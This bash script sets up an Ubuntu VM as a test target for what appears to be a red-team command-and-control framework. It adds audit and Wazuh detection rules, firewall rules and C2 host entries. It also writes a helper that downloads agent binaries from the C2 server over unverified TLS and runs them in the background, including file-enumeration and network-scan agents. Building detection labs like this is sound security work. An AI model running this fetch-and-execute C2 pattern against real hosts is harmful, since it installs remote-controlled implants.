#!/bin/bash
# Gla1v3 Linux Target VM Setup Script
# This script prepares an Ubuntu 22.04 VM for agent deployment and testing

set -e

# Configuration
C2_SERVER="${C2_SERVER:-192.168.1.100}"  # Change to your C2 server IP
INSTALL_WAZUH_AGENT="${INSTALL_WAZUH_AGENT:-false}"
ENABLE_AUDIT_LOGGING="${ENABLE_AUDIT_LOGGING:-true}"

echo "=== Gla1v3 Linux Target VM Setup ==="
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    echo "[-] Please run as root (sudo $0)"
    exit 1
fi

# 1. Configure network and DNS
echo "[*] Configuring network and hosts file..."
cat >> /etc/hosts <<EOF

# Gla1v3 C2 Infrastructure
$C2_SERVER c2.gla1v3.local
$C2_SERVER api.gla1v3.local
$C2_SERVER dashboard.gla1v3.local
$C2_SERVER wazuh.gla1v3.local
EOF
echo "[+] Hosts file configured"

# 2. Update system and install prerequisites
echo "[*] Updating system and installing prerequisites..."
apt-get update -qq
apt-get install -y curl wget git build-essential net-tools ca-certificates auditd

# Install Go (for building agents)
if ! command -v go &> /dev/null; then
    echo "[*] Installing Go..."
    wget -q https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
    rm -rf /usr/local/go
    tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz
    rm go1.21.5.linux-amd64.tar.gz
    echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile
    export PATH=$PATH:/usr/local/go/bin
fi

echo "[+] Prerequisites installed"

# 3. Configure audit logging
if [ "$ENABLE_AUDIT_LOGGING" = "true" ]; then
    echo "[*] Enabling advanced audit logging..."
    
    # Enable auditd
    systemctl enable auditd
    systemctl start auditd
    
    # Add audit rules
    cat > /etc/audit/rules.d/gla1v3.rules <<EOF
# Gla1v3 Detection Rules

# Monitor file access in sensitive directories
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /home -p wa -k home_access

# Monitor process execution
-a always,exit -F arch=b64 -S execve -k process_execution

# Monitor network connections
-a always,exit -F arch=b64 -S socket -S connect -k network_connect

# Monitor file operations
-a always,exit -F arch=b64 -S open -S openat -k file_access
EOF
    
    # Reload audit rules
    augenrules --load
    
    echo "[+] Audit logging enabled"
fi

# 4. Configure firewall
echo "[*] Configuring firewall..."

# Install ufw if not present
if ! command -v ufw &> /dev/null; then
    apt-get install -y ufw
fi

# Allow SSH
ufw allow 22/tcp

# Allow outbound HTTPS to C2
ufw allow out to $C2_SERVER port 443 proto tcp
ufw allow out to $C2_SERVER port 4443 proto tcp

# Enable firewall
ufw --force enable

echo "[+] Firewall configured"

# 5. Create agent directory
echo "[*] Creating agent directory..."
AGENT_DIR="/opt/gla1v3/agents"
mkdir -p $AGENT_DIR
chmod 755 $AGENT_DIR
echo "[+] Agent directory created: $AGENT_DIR"

# 6. Create deployment info file
cat > $AGENT_DIR/deployment-info.json <<EOF
{
  "hostname": "$(hostname)",
  "os_version": "$(lsb_release -d | cut -f2)",
  "kernel": "$(uname -r)",
  "setup_date": "$(date '+%Y-%m-%d %H:%M:%S')",
  "c2_server": "$C2_SERVER",
  "agent_directory": "$AGENT_DIR",
  "audit_logging_enabled": $ENABLE_AUDIT_LOGGING
}
EOF

# 7. Create quick deployment script
cat > $AGENT_DIR/deploy-agent.sh <<'DEPLOY_SCRIPT'
#!/bin/bash
# Quick Agent Deployment Script

AGENT_TYPE="${1:-main}"
C2_SERVER="https://api.gla1v3.local"
AGENT_DIR="/opt/gla1v3/agents"

echo "Downloading $AGENT_TYPE agent from C2..."

declare -A AGENT_MAP=(
    ["main"]="agent-linux"
    ["fileenum"]="agent-fileenum-linux"
    ["sysinfo"]="agent-sysinfo-linux"
    ["netscan"]="agent-netscan-linux"
)

AGENT_FILE="${AGENT_MAP[$AGENT_TYPE]}"
if [ -z "$AGENT_FILE" ]; then
    echo "[-] Unknown agent type: $AGENT_TYPE"
    echo "Available types: ${!AGENT_MAP[@]}"
    exit 1
fi

DOWNLOAD_URL="$C2_SERVER/download/$AGENT_FILE"
OUTPUT_PATH="$AGENT_DIR/$AGENT_FILE"

if curl -k -f -o "$OUTPUT_PATH" "$DOWNLOAD_URL"; then
    echo "[+] Agent downloaded to: $OUTPUT_PATH"
    chmod +x "$OUTPUT_PATH"
    
    echo "[*] Starting agent..."
    "$OUTPUT_PATH" &
    
    echo "[+] Agent started successfully! PID: $!"
else
    echo "[-] Failed to download agent"
    exit 1
fi
DEPLOY_SCRIPT

chmod +x $AGENT_DIR/deploy-agent.sh

# 8. Optional: Install Wazuh agent
if [ "$INSTALL_WAZUH_AGENT" = "true" ]; then
    echo "[*] Installing Wazuh agent..."
    
    curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import
    chmod 644 /usr/share/keyrings/wazuh.gpg
    
    echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee /etc/apt/sources.list.d/wazuh.list
    
    apt-get update -qq
    WAZUH_MANAGER="$C2_SERVER" apt-get install -y wazuh-agent
    
    systemctl enable wazuh-agent
    systemctl start wazuh-agent
    
    echo "[+] Wazuh agent installed and connected to $C2_SERVER"
fi

echo ""
echo "=== Setup Complete ==="
echo ""
echo "VM Information:"
echo "  Hostname: $(hostname)"
echo "  OS: $(lsb_release -d | cut -f2)"
echo "  C2 Server: $C2_SERVER"
echo "  Agent Directory: $AGENT_DIR"
echo "  Audit Logging: $ENABLE_AUDIT_LOGGING"
echo ""
echo "Next Steps:"
echo "  1. Take a VM snapshot (clean state)"
echo "  2. Deploy agents from dashboard or run: $AGENT_DIR/deploy-agent.sh"
echo "  3. Monitor detections in Wazuh dashboard"
echo "  4. Restore snapshot between tests"
echo ""
echo "Quick Deploy Command:"
echo "  sudo $AGENT_DIR/deploy-agent.sh main"
echo ""
